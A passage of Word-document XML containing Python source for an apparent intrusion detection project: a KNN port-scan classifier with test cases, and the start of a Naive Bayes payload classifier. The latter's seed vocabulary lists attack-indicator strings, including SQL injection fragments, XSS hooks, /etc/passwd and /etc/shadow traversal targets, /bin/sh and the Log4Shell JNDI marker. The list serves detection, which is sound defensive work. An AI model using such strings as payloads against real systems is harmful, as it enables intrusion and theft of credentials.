    <w:p w14:paraId="58A5BB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corrected = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690B14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samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691B7A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not isinstance(row, (list, tuple)) or len(row) &lt; 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E30D5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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1279ED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6AA2CF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02FD03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ports = float(row[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6C1F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pkts = float(row[1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F15C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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137271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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2879EB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684EAA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(not math.isfinite(ports) or not math.isfinite(pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF11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or ports &lt; 0 or pkts &lt;= 0 or ports &gt; pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392F52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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6769F7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674FD0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EDC7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label = "Scan" if str(row[2]).strip().lower() == "scan" else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C04F9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label == "Scan" and not cls._is_plausible_scan(ports, pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EBF8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label = "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189DDB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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF2EE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cleaned.append([ports, pkts, label])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C18E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cleaned, corrected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2074D6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44BE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classify(self, unique_ports, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11580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features = self._features(unique_ports, packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A17F5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ports, pkts, ratio = features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043ACDB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F3BE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Semantic guardrails sit in front of the learned classifier. KNN can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E105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only compare a point with its training data; it does not understand</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAF25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that zero ports cannot be a port scan. These invariants also protect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404C1A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runtime detection from a mislabeled or incompatible imported brain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42ADE9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self._is_plausible_scan(ports, pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E177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"Normal", []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A8E55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72DD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point = self._scale(features)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9DAA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dists = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA4AA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for ports, pkts, label in self.training_data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A35B7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 = self.euclidean_distance(point,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C09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self._scale(self._features(ports, pkts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE7C6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dists.append((d, label))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B637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8A42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dists.sort(key=lambda x: x[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7513BC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nearest = dists[:self.k]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11249F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15E0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Distance-weighted vote, each neighbour contributing 1/d.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73614B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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768B91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Plain majority voting treats all k neighbours as equally</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6368C9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authoritative, so an observation identical to a known Scan sample can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4606D5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still be outvoted by two samples that are further away. Weighting by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F42B4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inverse distance makes a closer neighbour count for more, which is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0956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what resolves the boundary between busy-but-legitimate traffic and a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A40FF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slow scan. Epsilon keeps an exact match finite rather than dividing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA3F7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by zero.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6B45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scan_weight = normal_weight = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416813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d, label in nearest:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B2E9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weight = 1.0 / (d + 1e-9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB882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label == "Scan":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1365D7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scan_weight += weight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45055D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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F294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normal_weight += weight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A383F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F76F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("Scan" if scan_weight &gt; normal_weight else "Normal"), nearest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518DEB7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8EB3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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1996B5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unique_ports, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CDDE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nearest = self.classify(unique_ports, packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E35D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confidence = share of the k neighbours voting for the winning label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9321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votes = sum(1 for _, lbl in nearest if lbl == verdict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6A8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confidence = votes / float(len(nearest)) if nearest else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFC4E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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C505B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verdict,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CABC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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BA41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detail={"unique_ports": unique_ports, "packet_count": packet_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796A89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"neighbours": [(round(d, 3), l) for d, l in nearest]},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0733FD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is_threat=(verdict == "Scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70833F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76200BB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6D71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samples, max_samples=5000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA51A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"""Store labelled (ports, packets, label) rows; KNN is a lazy learner.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEDA15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5312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Above max_samples the set is down-sampled per class so one dominant</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C05CD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 cannot crowd out the minority class in the neighbour vote.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1598E9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26489B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rows, corrected = self._sanitise_training_data(samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8C57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len(rows) &gt; max_samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050533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buckets = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339473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row in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611A78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buckets.setdefault(row[2], []).append(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8AA5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per = max(1, max_samples // max(1, len(buckets)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FE9F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kept = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0745DD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items in buckets.values():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4505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step = max(1, len(items) // per)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E2EE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kept.extend(items[::step][:per])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DEB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 = kept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF83C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self.training_data = rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5430C8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self._ranges = None          # recompute scaling for the new data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E82F5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counts = Counter(r[2] for r in rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31072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print("[KNN] %d samples %s%s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB541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(len(rows), dict(counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739122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" (%d invalid labels/rows corrected)" % corrected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F3BD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if corrected else ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC22D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{"samples": len(rows), "classes": dict(counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5E8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"corrected": corrected}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CF234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89A0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11EEA1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{"k": self.k, "training_data": self.training_data}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABC2E1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408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76A51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"training_data" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375C4E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cleaned, corrected = self._sanitise_training_data(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B476B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data["training_data"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DED6E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not cleaned:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B312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print("[!] KNN brain contained no valid signatures; "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CE72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"keeping safe built-in seed data.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0312B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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003577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self.training_data = cleaned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E376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self._ranges = None      # rescale against the imported data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E30D5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Federate Learning: KNN loaded %d external signatures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4269D9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"%s."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DAC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(len(self.training_data),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725004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" (%d corrected)" % corrected if corrected else ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DAFD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263071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2B7B81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23A00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BF23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8D13C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 = KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E03E2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print("feature ranges (min,max): %s" % e.feature_ranges())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361E5B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cases = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A56A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(1, 12, "idle host"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E3C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(12, 75, "normal browsing"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8404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(25, 150, "busy browsing (CDNs, ads)"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B415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(45, 50, "slow scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059F04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(400, 800, "aggressive scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4073B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(1, 1500, "SYN flood - must NOT be a scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338F3B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(2, 8000, "heavy flood - must NOT be a scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F063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5934DC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ports, pkts, note in cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0476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_ = e.classify(ports, pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323790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ratio = ports / float(pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A75A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print("ports=%-4d pkts=%-6d ratio=%.3f -&gt; %-7s (%s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673C1E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(ports, pkts, ratio, verdict, note))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087A95F5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src/engines/naive_bayes.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D78C27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(302 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25289E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2249987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6ADE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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF33D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engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5088C4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except ImportError:  # allow `python engines/naive_bayes.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D558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base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B6A7C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5058F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71A8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Seed vocabulary, grouped by attack family.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364762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word -&gt; (P(word|malicious), P(word|safe))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9488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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C57FC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The interim evaluation recorded Naive Bayes recall of 0.50 and attributed it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1671E8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to a "limited seeded vocabulary" (bug B-06): only twelve SQL-oriented tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF2F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were present, so any malicious payload that was not SQL injection produced a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470925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false negative. The table below widens coverage to cross-site scripting,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F40F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path traversal, command injection, template injection, deserialisation and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F580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scanner fingerprints.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2242AB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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CA1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Tokens were chosen for discriminative power rather than volume. Substrings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBA46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that occur in ordinary traffic are deliberately excluded - "curl" and "wget"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E317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for instance appear in legitimate User-Agent headers, so treating them as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF6B5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malicious would trade recall for a large false-positive count.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A4F1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DEFAULT_LIKELIHOODS = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDC85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SQL injection ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F9BB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"UNION":            (0.80, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519101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"SELECT":           (0.85, 0.0500),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E627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"UNION ALL":        (0.90, 0.0005),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1294E6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"OR 1=1":           (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755A23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"OR '1'='1":        (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0319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"SLEEP":            (0.60, 0.0100),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7807AB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"BENCHMARK(":       (0.88, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595816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"WAITFOR DELAY":    (0.92, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236F52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"INFORMATION_SCHEMA": (0.93, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CB08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"GROUP_CONCAT":     (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081CBD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"XP_CMDSHELL":      (0.96, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5198A6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"DROP":             (0.40, 0.0200),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684780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"INSERT":           (0.50, 0.0500),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2A3B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"UPDATE":           (0.50, 0.0500),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614B8F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CF1B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cross-site scripting ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664F3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"SCRIPT":           (0.70, 0.0200),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094DD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"ALERT(":           (0.80, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8CAB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"ONERROR":          (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA6B6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"ONLOAD":           (0.75, 0.0050),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB52C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"&lt;IMG":             (0.60, 0.0300),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7C64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"&lt;SVG":             (0.80, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082D9B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"JAVASCRIPT:":      (0.82, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B378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"DOCUMENT.COOKIE":  (0.94, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78351C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"PROMPT(":          (0.78, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288814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7793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path traversal / local file inclusion ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11621A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"/ETC/PASSWD":      (0.90, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B91E1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"/ETC/SHADOW":      (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267DE5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"../../":           (0.88, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DA29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"..%2F":            (0.92, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A80AB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"%2E%2E%2F":        (0.92, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7533C3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"/PROC/SELF":       (0.90, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF028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"BOOT.INI":         (0.88, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614022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8A92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command injection ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031031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"/BIN/SH":          (0.90, 0.0005),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4C3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"/BIN/BASH":        (0.88, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7166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";CAT ":            (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B655A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"|CAT ":            (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A40DB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"$(":               (0.55, 0.0300),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253AE3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"CHMOD ":           (0.60, 0.0100),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4269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DCAD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template / expression injection (incl. Log4Shell) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F5DC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"${JNDI:":          (0.97, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4808CE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"{{7*7}}":          (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F6FD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"&lt;%=":              (0.70, 0.0050),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62696D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A437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scanner and tooling fingerprints ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F94C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"SQLMAP":           (0.96, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE87F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"NIKTO":            (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7997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"ACUNETIX":         (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BA66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"NESSUS":           (0.93, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040128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"MASSCAN":          (0.90, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B701F5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6E4A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 weak signals: informative but common in ordinary traffic ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D36B0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"ROOT":             (0.30, 0.0800),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76151E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"ADMIN":            (0.40, 0.1000),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235179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07A7E9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C3FA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These words occur in ordinary URLs, usernames, documentation, and service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7BA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banners. They may add context to a real exploit signature, but must never be</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6300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sufficient to raise a payload alert on their own - even if an imported model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570C3A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assigned them an overconfident likelihood.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3BE8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WEAK_SIGNALS = {"ROOT", "ADMIN"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1450DF9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9E619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12F7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PayloadMonitor(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BA8A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"""Multinomial Naive Bayes over payload tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396823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3679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Scoring is done in log space rather than by multiplying probabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E159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payload matching a dozen tokens would otherwise multiply a dozen values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17234C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below 0.01 and underflow to exactly 0.0 in IEEE-754 double precision,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402A5F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making the two class scores indistinguishable (this was bug B-02).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A823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Summing logarithms is monotonically equivalent and numerically stable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31608B3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CA53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log P(class|payload) ~ log P(class) + SUM log P(token|class)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEC02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C2BB6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0B7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"naive_bayes"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079E7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("payload_bytes",)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CAC7E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6437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confidence_threshold=0.80):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B4B4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10/90 prior - rough guess at malicious vs safe in mixed traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597E8C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self.prior_malicious = 0.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EA05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self.prior_safe = 0.90</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE1ED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self.confidence_threshold = confidence_threshold</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085B2D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F6DD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word -&gt; (P(word|malicious), P(word|safe))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AF18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self.likelihoods = dict(DEFAULT_LIKELIHOODS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79495F3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D7D6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used by smoothing if we ever score unseen words</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094F5B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self.default_malicious_likelihood = 0.001</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446514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self.default_safe_likelihood = 0.01</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DEF2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F8AF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0A69B0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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13ABD4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"prior_malicious": self.prior_malicious,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FBBC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"prior_safe": self.prior_safe,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717C4F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"likelihoods": {k: list(v) for k, v in self.likelihoods.items()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49110D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E3193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E971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1CC1C6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isinstance(data, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E29A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205492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"prior_malicious" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6789CB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self.prior_malicious = float(data["prior_malicious"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C495E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"prior_safe" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BF30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self.prior_safe = float(data["prior_safe"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A286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"likelihoods" in data and isinstance(data["likelihoods"], dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101F6B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new = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206AC2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w, pair in data["likelihoods"].items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC67E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6BFF69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new[w.upper()] = (float(pair[0]), float(pair[1]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408B41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(TypeError, ValueError, IndexError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394D7C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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9CF7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new:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCA48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self.likelihoods = new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5758E7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Federate Learning: NaiveBayes loaded %d keyword likelihoods."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A599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len(self.likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54033A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1AF3ED1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DA85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classify(self, payload_bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3343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5B226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payload = payload_bytes.decode("utf-8", errors="ignore").upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6A87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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D599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"Safe", 0.0, []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3863EA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191C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len(payload) &lt; 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5AA2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"Safe", 0.0, []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2211F1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6FEF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log_mal = math.log(self.prior_malicious)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52515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log_safe = math.log(self.prior_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16ADD7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found = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26298B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CA2E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only score words actually present - absence shouldn't push</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415484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verdict toward 'safe' for short payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626296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word, (p_mal, p_safe) in self.likelihoods.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B447F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word in payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC9F8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found.append(word)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184484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log_mal += math.log(p_mal)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178A4B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log_safe += math.log(p_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F830FD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045E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softmax-style normalisation to a 0..1 confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CAE7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1B5435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top = max(log_mal, log_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088C01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em = math.exp(log_mal - top)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1D25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es = math.exp(log_safe - top)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F28FC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 = em / (em + es)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226224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OverflowError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A24E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 = 1.0 if log_mal &gt; log_safe else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6501A5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2B90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strong_found = [word for word in found if word not in WEAK_SIGNALS]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214462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confidence &gt;= self.confidence_threshold and strong_found:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577C25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"Malicious", confidence, found</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C6C1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"Safe", confidence, found</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E8B0B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CF4D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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCF4B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payload_bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA361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confidence, found = self.classify(payload_bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DBCE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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6383A1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verdict,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCECD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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A3F8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detail={"keywords": found, "vocabulary": len(self.likelihoods)},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489046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is_threat=(verdict == "Malicious"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E6D5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6FA8495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1293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samples, laplace=1.0, discover=True, top_n=40):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B844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"""Fit priors and likelihoods from labelled (payload, label) rows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052763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191A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When `discover` is set, the vocabulary is *learned* from the corpus by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0526DD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log-odds feature selection instead of relying only on the seeded token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F132B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list, which is the principled fix for the low-recall finding: tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7AF4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that actually separate the two classes in the training data are kept,</w:t>
      </w:r>
    </w:p>
